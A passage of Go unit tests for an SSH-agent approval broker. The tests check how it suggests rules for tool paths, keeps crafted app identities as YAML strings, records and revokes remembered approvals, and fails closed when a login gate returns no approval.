		r := parseSuggestion(t, s)
		if r["scope"] != "use" || r["gate"] != "login" {
			t.Fatalf("a path: suggestion is one-shot with a login:\n%s", s)
		}
		apps, _ := r["apps"].(map[string]any)
		return apps["path"]
	}
	// No opt/ link (yet): the Cellar file itself.
	if got := pathOf(suggest(cellar, adhoc)); got != cellar {
		t.Fatalf("got %v, want %s", got, cellar)
	}
	if err := os.Symlink(filepath.Join(d, "Cellar/mytool/1.2"), filepath.Join(d, "opt/mytool")); err != nil {
		t.Fatal(err)
	}
	for _, code := range []platform.CodeIdentity{adhoc, fake.Unsigned} {
		if got := pathOf(suggest(cellar, code)); got != opt {
			t.Fatalf("got %v, want the opt/ link %s", got, opt)
		}
	}
	// The link names another version: not this file, so the Cellar path.
	old := filepath.Join(d, "Cellar/mytool/1.1/bin/mytool")
	if got := pathOf(suggest(old, adhoc)); got != old {
		t.Fatalf("got %v, want %s", got, old)
	}
	// Every path: suggestion pasted into a key's rules is a valid config.
	var b strings.Builder
	b.WriteString("apiVersion: nazar/v1\nkind: Config\nssh_agent:\n  keys:\n    k:\n      rules:\n")
	for _, l := range strings.Split(suggest(cellar, adhoc), "\n") {
		b.WriteString("        " + l + "\n")
	}
	if c, probs := config.Parse([]byte(b.String()), config.Env{Home: "/Users/u"}); probs.HasErrors() || c.SSHAgent.Keys["k"].Rules[0].Apps[0].Path != opt {
		t.Fatalf("does not parse as the rule: %v\n%s", probs.Error(), b.String())
	}
	for name, s := range map[string]string{
		"an interpreter":       suggest("/opt/homebrew/bin/python3", adhoc),
		"a team-signed tool":   suggest("/opt/homebrew/bin/tool", platform.CodeIdentity{Signed: true, TeamID: "TEAM000001", SigningID: "tool", CDHash: []byte{1}}),
		"Apple's ssh alone":    SuggestRule(e.r.Resolve(e.f.Launch(platform.ProcessRef{}, fake.SSHProc("h")))),
		"a relative path":      suggest("tool", adhoc),
		"on the system volume": suggest("/usr/libexec/tool", adhoc),
	} {
		if r := parseSuggestion(t, s); r["apps"] != "unknown" {
			t.Errorf("%s: want apps: unknown:\n%s", name, s)
		}
	}
	// A crafted path stays one scalar and reads back as itself.
	for _, id := range craftedIDs {
		p := "/tmp/x" + id
		if filepath.Clean(p) != p {
			continue
		}
		s := suggest(p, adhoc)
		if got := pathOf(s); got != p {
			t.Fatalf("path %q reads back as %q:\n%s", p, got, s)
		}
	}
}

// A crafted identity that is also a bare YAML bool, null or number must
// round-trip as a string even once pasted into a full config.
func TestSuggestRuleKeepsStrings(t *testing.T) {
	e := newEnv(t)
	for _, id := range []string{"yes", "null", "true", "1e3", "0x10", "2026-10-04"} {
		app := e.f.Launch(platform.ProcessRef{}, fake.Proc{Path: "/Applications/Evil.app/Contents/MacOS/Evil", Code: fake.Unsigned, App: &fake.App{BundleID: id, Name: "Evil"}})
		s := SuggestRule(e.r.Resolve(e.f.Launch(app, fake.SSHProc("h"))))
		var b strings.Builder
		b.WriteString("apiVersion: nazar/v1\nkind: Config\nssh_agent:\n  keys:\n    k:\n      rules:\n")
		for _, l := range strings.Split(s, "\n") {
			b.WriteString("        " + l + "\n")
		}
		cfg, probs := config.Parse([]byte(b.String()), config.Env{Home: "/Users/u"})
		if probs.HasErrors() {
			t.Fatalf("%q: suggestion does not parse: %v\n%s", id, probs.Error(), b.String())
		}
		rules := cfg.SSHAgent.Keys["k"].Rules
		if len(rules) != 1 || len(rules[0].Apps) != 1 || rules[0].Apps[0].Kind != config.MatchApp || rules[0].Apps[0].ID != id {
			t.Fatalf("%q: parsed config does not match app %s exactly: %+v", id, strconv.Quote(id), rules)
		}
	}
}

// The result's Allowed() is true exactly for allowed and approved.
func TestResultAllowed(t *testing.T) {
	for d, want := range map[audit.Decision]bool{
		audit.Allowed: true, audit.Approved: true, audit.Denied: false,
		audit.Timeout: false, audit.Blocked: false, audit.Error: false, "": false,
	} {
		if got := (Result{Decision: d}).Allowed(); got != want {
			t.Errorf("Result{%q}.Allowed() = %v", d, got)
		}
	}
}

// Spec 4.3, 4.6: a remembered approval records what `nazar status` shows
// (scope, chain, when it was approved, when it expires) and what
// `nazar revoke --app` / `--session` and the exit watcher select on. Each
// field is pinned to the request that produced it, and the status order and
// revoke selectors are exercised through them.
func TestRememberedApprovalMetadata(t *testing.T) {
	e := newEnv(t)
	e.f.SetDefaults(fake.Answer{Allow: true}, fake.Answer{Allow: true})
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	login := e.req("github", tab.Peer()) // rule 2: login, session, expire 8h
	loginAt := e.f.Now()
	lr := e.b.Handle(login)
	if lr.Decision != audit.Approved {
		t.Fatalf("%+v", lr)
	}
	e.f.Advance(time.Minute)
	claude := e.f.ITermTab(tab.App, fake.ClaudeProc(), fake.SSHProc("h"))
	dialog := e.req("github", claude.Peer()) // rule 1: dialog, session, no expire
	dialogAt := e.f.Now()
	dr := e.b.Handle(dialog)
	if dr.Decision != audit.Approved {
		t.Fatalf("%+v", dr)
	}
	end := e.f.Now()

	l := e.cache.List()
	if len(l) != 2 {
		t.Fatalf("want two remembered approvals, got %+v", l)
	}
	a, b := l[0], l[1]
	// Created is the clock at approval time (the fake clock ticks a little on
	// every read), and status lists oldest first by it.
	if a.Created.Before(loginAt) || a.Created.After(dialogAt) {
		t.Fatalf("login Created %v, want within [%v, %v]", a.Created, loginAt, dialogAt)
	}
	if b.Created.Before(dialogAt) || b.Created.After(end) {
		t.Fatalf("dialog Created %v, want within [%v, %v]", b.Created, dialogAt, end)
	}
	if !a.Created.Before(b.Created) {
		t.Fatalf("status order: login %v must come before dialog %v", a.Created, b.Created)
	}
	keyOf := func(r Result) approval.Key {
		return approval.Key{Target: r.Outcome.Target, Rule: r.Outcome.RuleID, ScopeID: r.Outcome.ScopeID, Receiver: r.Outcome.Receiver, Op: "login:SHA256:gh"}
	}
	if a.Key != keyOf(lr) || b.Key != keyOf(dr) || a.Key == b.Key {
		t.Fatalf("keys: %+v / %+v", a.Key, b.Key)
	}
	if a.Scope != "session" || b.Scope != "session" {
		t.Fatalf("Scope: login %q, dialog %q; want session", a.Scope, b.Scope)
	}
	if !a.Expires.Equal(a.Created.Add(8*time.Hour)) || !b.Expires.IsZero() {
		t.Fatalf("Expires: login %v (want Created+8h = %v), dialog %v (want zero)", a.Expires, a.Created.Add(8*time.Hour), b.Expires)
	}
	if a.Chain != login.Chain.Summary() || b.Chain != dialog.Chain.Summary() {
		t.Fatalf("Chain: login %q (want %q), dialog %q (want %q)", a.Chain, login.Chain.Summary(), b.Chain, dialog.Chain.Summary())
	}
	if a.Covers != "github.com" || b.Covers != "github.com" {
		t.Fatalf("Covers: login %q, dialog %q; want github.com (Milestone 7)", a.Covers, b.Covers)
	}
	if !strings.HasPrefix(a.Chain, "iTerm2 → ") || !strings.HasSuffix(a.Chain, " → ssh") || !strings.Contains(b.Chain, " → claude → ssh") {
		t.Fatalf("chain summaries: %q / %q", a.Chain, b.Chain)
	}
	if a.App != "com.googlecode.iterm2" || b.App != "com.googlecode.iterm2" {
		t.Fatalf("App: login %q, dialog %q; want com.googlecode.iterm2", a.App, b.App)
	}
	if a.Ref == 0 || b.Ref != 0 {
		t.Fatalf("Ref: login %v (want non-zero), dialog %v (want 0)", a.Ref, b.Ref)
	}

	// `nazar revoke --session <id>` selects on the key's scope id.
	if n := e.cache.RevokeScope("session:nope", "revoked"); n != 0 {
		t.Fatalf("revoked %d approvals for an unknown session", n)
	}
	if n := e.cache.RevokeScope(a.Key.ScopeID, "revoked"); n != 1 || len(e.cache.List()) != 1 || e.cache.List()[0].Key != b.Key {
		t.Fatalf("revoke --session removed %d, left %+v", n, e.cache.List())
	}
	// `nazar revoke --app <bundle-id>` selects on App.
	if n := e.cache.RevokeApp("com.example.other", "revoked"); n != 0 {
		t.Fatalf("revoked %d approvals for another app", n)
	}
	if n := e.cache.RevokeApp("com.googlecode.iterm2", "revoked"); n != 1 || len(e.cache.List()) != 0 {
		t.Fatalf("revoke --app removed %d, left %+v", n, e.cache.List())
	}
	if e.f.LiveApprovals() != 0 {
		t.Fatal("revoked login approval must be released")
	}
}

// scope: app approvals carry Scope "app" and the app they belong to, so that
// status shows the scope and `nazar revoke --app` finds them.
func TestAppScopedApprovalMetadata(t *testing.T) {
	e := newEnvWith(t, moreCfg, 200*time.Millisecond)
	e.f.SetDefaults(fake.Answer{}, fake.Answer{Allow: true})
	e.f.Advance(time.Hour)
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	req := e.req("appkey", tab.Peer())
	start := e.f.Now()
	r := e.b.Handle(req)
	if r.Decision != audit.Approved {
		t.Fatalf("%+v", r)
	}
	end := e.f.Now()
	l := e.cache.List()
	if len(l) != 1 {
		t.Fatalf("want one approval, got %+v", l)
	}
	a := l[0]
	if a.Scope != "app" || a.Key.ScopeID != r.Outcome.ScopeID || !strings.HasPrefix(a.Key.ScopeID, "app:") {
		t.Fatalf("Scope %q, ScopeID %q", a.Scope, a.Key.ScopeID)
	}
	if a.Created.Before(start) || a.Created.After(end) || !a.Expires.IsZero() {
		t.Fatalf("Created %v (want within [%v, %v]), Expires %v (want zero)", a.Created, start, end, a.Expires)
	}
	if a.Chain != req.Chain.Summary() || a.Chain == "" {
		t.Fatalf("Chain %q, want %q", a.Chain, req.Chain.Summary())
	}
	if a.App != "com.googlecode.iterm2" {
		t.Fatalf("App %q", a.App)
	}
	if n := e.cache.RevokeApp("com.googlecode.iterm2", "revoked"); n != 1 || len(e.cache.List()) != 0 {
		t.Fatalf("revoke --app removed %d, left %+v", n, e.cache.List())
	}
}

// zeroRefPlatform is a login gate that reports success without an approval:
// Authenticate returns (0, nil). Nothing can sign with a zero ref, so the
// broker must treat such an answer as a failed gate, never as "approved".
type zeroRefPlatform struct {
	*fake.Fake
	calls atomic.Int32
}

func (z *zeroRefPlatform) Authenticate(platform.AuthPolicy, platform.Prompt) (platform.ApprovalRef, error) {
	z.calls.Add(1)
	return 0, nil
}

// withZeroRefLogin rebuilds e's broker over a zeroRefPlatform.
func withZeroRefLogin(e *env) *zeroRefPlatform {
	zp := &zeroRefPlatform{Fake: e.f}
	o := e.b.o
	o.Platform = zp
	e.b = New(o)
	return zp
}

// A login gate that returns no approval and no error fails closed: the
// request is an error, the operation does not run, nothing is remembered,
// and the next request asks again. Same for one-shot logins and for Login().
func TestLoginWithoutApprovalFailsClosed(t *testing.T) {
	e := newEnv(t)
	zp := withZeroRefLogin(e)
	tab := e.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	for i := 1; i <= 2; i++ {
		r := e.b.Handle(e.req("github", tab.Peer())) // rule 2: login
		if r.Allowed() || r.Decision != audit.Error || !strings.Contains(r.Reason, "no approval") {
			t.Fatalf("request %d: a login gate that returned no approval was treated as %+v", i, r)
		}
		if e.calls.Load() != 0 || len(e.cache.List()) != 0 {
			t.Fatalf("request %d: Do ran %d times, cache %+v", i, e.calls.Load(), e.cache.List())
		}
		if got := zp.calls.Load(); got != int32(i) {
			t.Fatalf("request %d: login gate shown %d times", i, got)
		}
		if f := e.lastLine(t); f["decision"] != "error" || f["gate"] != "login" {
			t.Fatalf("audit %v", f)
		}
	}

	one := newEnvWith(t, moreCfg, 200*time.Millisecond)
	withZeroRefLogin(one)
	tab = one.f.ITermTab(platform.ProcessRef{}, fake.SSHProc("h"))
	if r := one.b.Handle(one.req("userkey", tab.Peer())); r.Allowed() || r.Decision != audit.Error || one.calls.Load() != 0 {
		t.Fatalf("one-shot login without an approval: %+v (Do ran %d times)", r, one.calls.Load())
	}

	if d, reason := e.b.Login(platform.Prompt{Title: "Apply config?"}); d != audit.Error || !strings.Contains(reason, "no approval") {
		t.Fatalf("Login() without an approval: %v %q", d, reason)
	}
}

// A block of an app whose running code doesn't verify says to restart it,
// not that the caller has no rule (a rule for it exists and can't match).
func TestBlockedWhyNamesAStaleApp(t *testing.T) {
	stale := &caller.Chain{AppSource: caller.AppFromChain,
		App: platform.AppInfo{BundleID: "com.googlecode.iterm2", Name: "iTerm2", Code: platform.CodeIdentity{TeamID: "H7V7XYVQ7D"}}}
	if got := blockedWhy(policy.Outcome{}, stale); !strings.Contains(got, "quit and reopen iTerm2") {
		t.Fatalf("stale app: %q", got)
	}
	ok := &caller.Chain{AppSource: caller.AppFromChain,
		App: platform.AppInfo{BundleID: "com.googlecode.iterm2", Name: "iTerm2", Code: platform.CodeIdentity{Signed: true, TeamID: "H7V7XYVQ7D"}}}
	if got := blockedWhy(policy.Outcome{}, ok); !strings.HasPrefix(got, "This caller has no rule.") {
		t.Fatalf("valid app: %q", got)
	}
}

// Spec 4.2: `apps: any` with `gate: none` is the user's choice and
// covers unknown chains too (an orphaned terminal helper, a ControlPersist
// master): allowed silently, signed, audited; a forwarded request still gets
// its one-time dialog.
func TestAnyUnderGateNoneAllowsUnknownSilently(t *testing.T) {
	e := newEnvWith(t, "apiVersion: nazar/v1\nkind: Config\nssh_agent:\n  keys:\n    open:\n      rules:\n        - apps: [any]\n          gate: none\n", time.Second)
	mux := e.f.Launch(platform.ProcessRef{}, fake.SSHProc("[mux]"))
	if r := e.b.Handle(e.req("open", mux)); r.Decision != audit.Allowed || r.Reason != "gate none" {
		t.Fatalf("%+v", r)
	}
	if len(e.f.Shown()) != 0 || e.calls.Load() != 1 {
		t.Fatalf("want a silent sign: shown %d, signs %d", len(e.f.Shown()), e.calls.Load())
	}
	if e.lastLine(t)["decision"] != "allowed" {
		t.Fatal("not audited")
	}
}
